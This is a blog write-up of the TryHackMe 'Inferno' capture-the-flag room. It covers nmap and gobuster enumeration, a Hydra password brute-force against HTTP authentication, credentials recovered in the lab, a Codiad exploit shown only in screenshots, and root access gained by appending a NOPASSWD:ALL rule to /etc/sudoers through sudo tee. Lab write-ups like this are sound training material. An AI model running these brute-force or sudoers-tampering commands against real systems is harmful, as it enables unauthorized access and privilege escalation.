---
title: "Inferno TryHackMe"
layout: post
date: 2023-08-19 19:00
tag: 
- TryHackMe
- Pentesting
- Inferno
- Linux
- CTF
- Meduim
image: https://tryhackme-images.s3.amazonaws.com/room-icons/04838068cabd2452b322e06418cce864.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "A meduim TryHackMe box, with basic web enumeration and API fuzzing."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

A meduim real Life machine + CTF.

---
# Nmap

```bash
nmap -A -T4 10.10.144.11   
Starting Nmap 7.91 ( https://nmap.org ) at 2023-08-19 13:05 +01
Nmap scan report for 10.10.144.11
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dantes Inferno
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I used the common.txt wordlist but I found nothing, then I used the meduim.txt and found the */inferno* endpoint which needed an authentification :

# Gobuster

```bash
gobuster dir -u http://10.10.144.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.144.11
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/08/19 13:14:59 Starting gobuster in directory enumeration mode
===============================================================
/inferno              (Status: 401) [Size: 459]
```

The only way was to bruteforce it using **Hydra** :

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.144.11 http-get /inferno
[80][http-get] host: 10.10.131.118   login: admin   password: dante1
```

Valid combination found : **admin:dante1**

![!\[\[Pasted image 20230819133810.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819133810.png>)

The user has used the same credentials found before (**admin:dante1**).

<p>I saw the title of the webpage 'Codiad' and I went to look for possible exploits :</p>

![!\[\[Pasted image 20230819141402.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819141402.png>)

![!\[\[Pasted image 20230819135144.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819135144.png>)

Now I'm in as www-data :

![!\[\[Pasted image 20230819135158.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819135158.png>)

![!\[\[Pasted image 20230819135133.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819135133.png>)

# www-data -> dante


I found a dat file in */home/dante/Downloads* which contains an encoded hex string :

![!\[\[Pasted image 20230819135823.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819135823.png>)

The decoded output contains the user dante's password :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230819135800.png>)

**dante : V1rg1l10h3lpm3**

Now I'm in as *dante* :

![!\[\[Pasted image 20230819135948.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819135948.png>)

# PE

![!\[\[Pasted image 20230819140016.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819140016.png>)

We see in the output of *sudo -l* that dante can run */usr/bin/tee* as root, **GTFObins** will helps us to exploit that:

[https://gtfobins.github.io/gtfobins/tee](https://gtfobins.github.io/gtfobins/tee)

```bash
echo 'dante ALL=(ALL) NOPASSWD:ALL' | sudo /usr/bin/tee -a /etc/sudoers
```

BOOM I'm root!

And now we can read the root flag and Voilà :

![!\[\[Pasted image 20230819141116.png\]\]](<../../../assets/images/THMPics/Pasted image 20230819141116.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>